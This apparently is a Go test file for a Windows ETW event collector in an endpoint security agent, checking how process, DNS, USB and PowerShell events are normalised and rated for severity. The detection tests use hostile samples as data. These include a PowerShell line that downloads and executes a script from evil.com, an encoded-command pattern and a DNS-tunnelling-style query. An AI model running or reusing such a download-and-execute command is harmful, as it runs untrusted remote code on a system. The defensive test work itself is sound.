//go:build windows

package etw

import (
	"context"
	"encoding/json"
	"testing"
	"time"

	"github.com/hivearmor/agent/config"
	"github.com/hivearmor/sdk/plugins"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestNormaliseProcessEvent_Start(t *testing.T) {
	c := New(&config.Config{AgentID: 1})
	evt := &ETWEvent{Timestamp: time.Now().UTC().Format(time.RFC3339Nano)}
	props := map[string]interface{}{
		"ProcessID":       uint32(1234),
		"ParentProcessID": uint32(5),
		"ImageFileName":   `C:\Windows\System32\cmd.exe`,
		"CommandLine":     "cmd.exe /c whoami",
	}
	c.normaliseProcessEvent(1, props, evt)
	assert.Equal(t, "PROCESS_CREATE", evt.EventType)
	assert.Equal(t, DataTypeProcess, evt.DataType)
	assert.Equal(t, uint32(1234), evt.PID)
	assert.Equal(t, "cmd.exe", evt.ProcessName)
}

func TestNormaliseProcessEvent_Stop(t *testing.T) {
	c := New(&config.Config{AgentID: 1})
	evt := &ETWEvent{Timestamp: time.Now().UTC().Format(time.RFC3339Nano)}
	props := map[string]interface{}{
		"ProcessID": uint32(9999),
		"ExitCode":  int32(0),
	}
	c.normaliseProcessEvent(2, props, evt)
	assert.Equal(t, "PROCESS_EXIT", evt.EventType)
	assert.Equal(t, uint32(9999), evt.PID)
}

func TestNormaliseDNSEvent(t *testing.T) {
	c := New(&config.Config{AgentID: 2})
	evt := &ETWEvent{Timestamp: time.Now().UTC().Format(time.RFC3339Nano)}
	props := map[string]interface{}{
		"QueryName":    "evil.domain.com",
		"QueryType":    uint16(1),
		"QueryStatus":  uint32(0),
		"QueryResults": "1.2.3.4",
		"QueryPID":     uint32(8080),
	}
	c.normaliseDNSEvent(3008, props, evt)
	assert.Equal(t, DataTypeDNS, evt.DataType)
	assert.Equal(t, "evil.domain.com", evt.Query)
	assert.Equal(t, "A", evt.QueryType)
	assert.Equal(t, "NOERROR", evt.ResponseCode)
	assert.Equal(t, "INFO", evt.Severity)
}

func TestNormaliseDNSTunneling(t *testing.T) {
	c := New(&config.Config{AgentID: 2})
	evt := &ETWEvent{Timestamp: time.Now().UTC().Format(time.RFC3339Nano)}
	longQuery := "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.com"
	props := map[string]interface{}{
		"QueryName":    longQuery,
		"QueryType":    uint16(16),
		"QueryStatus":  uint32(0),
		"QueryResults": "",
		"QueryPID":     uint32(42),
	}
	c.normaliseDNSEvent(3008, props, evt)
	assert.Equal(t, "MEDIUM", evt.Severity, "long DNS queries should be MEDIUM severity")
}

func TestNormalisePowerShellScriptBlock(t *testing.T) {
	c := New(&config.Config{AgentID: 3})
	evt := &ETWEvent{Timestamp: time.Now().UTC().Format(time.RFC3339Nano)}
	props := map[string]interface{}{
		"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
		"Path":            "",
		"ProcessId":       uint32(1111),
	}
	c.normalisePowerShellEvent(4104, props, evt)
	assert.Equal(t, DataTypePowerShell, evt.DataType)
	assert.Equal(t, "HIGH", evt.Severity)
}

func TestNormaliseUSBEvent(t *testing.T) {
	c := New(&config.Config{AgentID: 4})
	evt := &ETWEvent{Timestamp: time.Now().UTC().Format(time.RFC3339Nano)}
	props := map[string]interface{}{
		"DeviceInstanceID":   "USB\\VID_8564&PID_1000\\1234567890ABCDEF",
		"DeviceDescription": "Mass Storage Device",
	}
	c.normaliseUSBEvent(2003, props, evt)
	assert.Equal(t, "USB_ARRIVE", evt.EventType)
	assert.Equal(t, DataTypeUSB, evt.DataType)
	assert.Equal(t, "USB\\VID_8564&PID_1000\\1234567890ABCDEF", evt.DeviceInstance)
}

func TestEmitToQueue(t *testing.T) {
	queue := make(chan *plugins.Log, 10)
	c := New(&config.Config{AgentID: 5})
	c.queue = queue

	evt := &ETWEvent{
		EventType:  "PROCESS_CREATE",
		DataType:   DataTypeProcess,
		Timestamp:  time.Now().UTC().Format(time.RFC3339Nano),
		Hostname:   "test-host",
		DataSource: "test-host (agent-5)",
		Severity:   "INFO",
	}
	c.emit(evt)

	require.Len(t, queue, 1)
	log := <-queue
	assert.Equal(t, DataTypeProcess, log.DataType)

	var decoded ETWEvent
	require.NoError(t, json.Unmarshal([]byte(log.Raw), &decoded))
	assert.Equal(t, "PROCESS_CREATE", decoded.EventType)
}

func TestCollector_StopsCleanly(t *testing.T) {
	c := New(&config.Config{AgentID: 99})
	queue := make(chan *plugins.Log, 16)
	ctx, cancel := context.WithCancel(context.Background())

	done := make(chan struct{})
	go func() {
		defer close(done)
		c.Start(ctx, queue)
	}()

	cancel()
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Fatal("ETW collector did not stop within 2s")
	}
}

func TestProcessStartSeverity(t *testing.T) {
	assert.Equal(t, "HIGH", processStartSeverity(`C:\Windows\temp\malware.exe`, ""))
	assert.Equal(t, "HIGH", processStartSeverity("cmd.exe", "cmd /c powershell -enc BASE64"))
	assert.Equal(t, "INFO", processStartSeverity(`C:\Windows\System32\notepad.exe`, "notepad.exe"))
}

func TestDNSTypeString(t *testing.T) {
	assert.Equal(t, "A", dnsTypeString(1))
	assert.Equal(t, "AAAA", dnsTypeString(28))
	assert.Equal(t, "TYPE99", dnsTypeString(99))
}
